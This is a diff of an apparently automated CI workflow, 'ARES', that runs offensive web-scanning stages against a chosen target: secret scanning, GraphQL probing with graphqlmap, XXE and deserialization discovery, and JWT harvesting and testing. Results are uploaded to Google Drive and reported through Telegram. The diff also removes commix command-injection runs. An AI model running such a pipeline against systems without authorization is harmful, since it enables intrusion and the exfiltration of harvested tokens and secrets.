+          gitleaks detect --no-git -v > output/secrets/gitleaks.txt 2>&1 || true
+          git-secrets --scan > output/secrets/git_secrets.txt 2>&1 || true
           
-          zip -r sql.zip output/sql/
-          python3 drive_upload.py sql.zip Stage_11_SQL
+          zip -r secrets.zip output/secrets/
+          python3 drive_upload.py secrets.zip Stage_17_Secrets
         '
-        ### STAGE 12: NoSQL
-        run_stage "Stage 12: NoSQL Testing" '
-          mkdir -p output/nosql
-          echo "NoSQL testing - checking for MongoDB/CouchDB endpoints" > output/nosql/info.txt
+        ### STAGE 18: GRAPHQL & API
+        run_stage "Stage 18: GraphQL & API" '
+          grep -iE "graphql|/api/" output/crawl/all_urls.txt > output/graphql/found_apis.txt 2>/dev/null || true
           
-          # Look for NoSQL indicators in crawled data
-          grep -iE "mongodb|couchdb|\.json|api.*id=" output/crawl/all_urls.txt > output/nosql/potential_nosql.txt 2>/dev/null || true
+          for path in /graphql /api/graphql /v1/graphql /graphql/console; do
+            echo "https://$TARGET$path" >> output/graphql/endpoints.txt
+          done
           
-          zip -r nosql.zip output/nosql/
-          python3 drive_upload.py nosql.zip Stage_12_NoSQL
+          while read endpoint; do
+            [ -n "$endpoint" ] || continue
+            timeout 120 graphqlmap -u "$endpoint" -v >> output/graphql/graphqlmap.txt 2>&1 || true
+          done < output/graphql/endpoints.txt
+          
+          zip -r graphql.zip output/graphql/ output/api/
+          python3 drive_upload.py graphql.zip Stage_18_GraphQL
         '
-        ### STAGE 13: COMMAND INJECTION (ALL PARAMS)
-        run_stage "Stage 13: Command Injection Testing" '
-          mkdir -p output/templates
-          if [ -s output/crawl/params_only.txt ]; then
-            echo "[+] Running commix on ALL parameterized URLs..."
-            cat output/crawl/params_only.txt | while read url; do
-              [ -n "$url" ] || continue
-              echo "  commix: $url"
-              commix -u "$url" --batch --all > "output/templates/commix_$(echo $url | md5sum | cut -c1-8).txt" 2>&1 || true
-            done
-          else
-            echo "No parameterized URLs" > output/templates/no_params.txt
-          fi
+        ### STAGE 19: XXE & DESERIALIZATION
+        run_stage "Stage 19: XXE & Deserialization" '
+          mkdir -p output/xxe output/deserialization
+          grep -iE "\.xml|xml=|xmlrpc|soap|wsdl" output/crawl/all_urls.txt > output/xxe/endpoints.txt 2>/dev/null || true
+          grep -iE "serialize|base64|viewstate|pickle" output/crawl/all_urls.txt > output/deserialization/endpoints.txt 2>/dev/null || true
+          phpggc --list > output/deserialization/phpggc.txt 2>&1 || true
           
-          zip -r templates.zip output/templates/
-          python3 drive_upload.py templates.zip Stage_13_CommandInjection
+          zip -r xxe_deser.zip output/xxe/ output/deserialization/
+          python3 drive_upload.py xxe_deser.zip Stage_19_XXE_Deserialization
         '
-        ### STAGE 14: XXE
-        run_stage "Stage 14: XXE Testing" '
-          mkdir -p output/xxe
-          
-          # Find XML-related endpoints
-          grep -iE "\.xml|xml=|xmlrpc|soap|wsdl" output/crawl/all_urls.txt > output/xxe/xml_endpoints.txt 2>/dev/null || true
-          echo "[+] Found $(wc -l < output/xxe/xml_endpoints.txt 2>/dev/null || echo 0) potential XML endpoints"
-          
-          zip -r xxe.zip output/xxe/
-          python3 drive_upload.py xxe.zip Stage_14_XXE
-        '
-        ### STAGE 15: AUTH TESTING
-        run_stage "Stage 15: Authentication Testing" '
+        ### STAGE 20: JWT & AUTH
+        run_stage "Stage 20: JWT & Authentication" '
           mkdir -p output/auth
+          grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" output/crawl/all_urls.txt 2>/dev/null | sort -u > output/specialized/found_jwts.txt || true
+          grep -iE "login|signin|auth|password|register|session|token" output/crawl/all_urls.txt > output/auth/endpoints.txt 2>/dev/null || true
           
-          # Find auth endpoints
-          grep -iE "login|signin|auth|password|register|forgot|reset|session|token|oauth|jwt|api.key" output/crawl/all_urls.txt > output/auth/auth_endpoints.txt 2>/dev/null || true
-          echo "[+] Found $(wc -l < output/auth/auth_endpoints.txt 2>/dev/null || echo 0) auth-related endpoints"
+          echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > output/specialized/sample.jwt
+          jwt_tool $(cat output/specialized/sample.jwt) > output/specialized/jwt_tool.txt 2>&1 || true
           
-          # Interactsh for OOB
-          timeout 60 interactsh-client -v > output/auth/interactsh.txt 2>&1 || true
-          
-          zip -r auth.zip output/auth/
-          python3 drive_upload.py auth.zip Stage_15_Auth
-        '
-        ### STAGE 16: DESERIALIZATION
-        run_stage "Stage 16: Deserialization Testing" '
-          mkdir -p output/deserialization
-          phpggc --list > output/deserialization/phpggc_list.txt 2>&1 || true
-          
-          # Find serialization endpoints
-          grep -iE "serialize|base64|viewstate|__java|ysoserial|pickle|marshal" output/crawl/all_urls.txt > output/deserialization/endpoints.txt 2>/dev/null || true
-          
-          zip -r deserialization.zip output/deserialization/
-          python3 drive_upload.py deserialization.zip Stage_16_Deserialization
+          zip -r auth.zip output/auth/ output/specialized/
+          python3 drive_upload.py auth.zip Stage_20_Auth
         '
         echo ""
         echo "=========================================="
-        echo "🏁 ARES AGGRESSIVE MODE COMPLETED"
+        echo "🏁 ARES MAXIMUM POWER COMPLETED"
         echo "=========================================="
-        tg "🏁 *ARES AGGRESSIVE* completed on \`$TARGET\`"
+        tg "🏁 *ARES MAXIMUM POWER* completed on \`$TARGET\` - 20 stages"
     - name: Cleanup
       if: always()
       run: |
         rm -rf output/ *.zip drive_upload.py test.tf 2>/dev/null || true
-        rm -rf $HOME/tools/ $HOME/SecLists/ $HOME/.jaeles/ 2>/dev/null || true
+        rm -rf $HOME/tools/ $HOME/SecLists/ $HOME/.jaeles/ $HOME/.gf/ 2>/dev/null || true
         echo "✅ Cleanup complete"
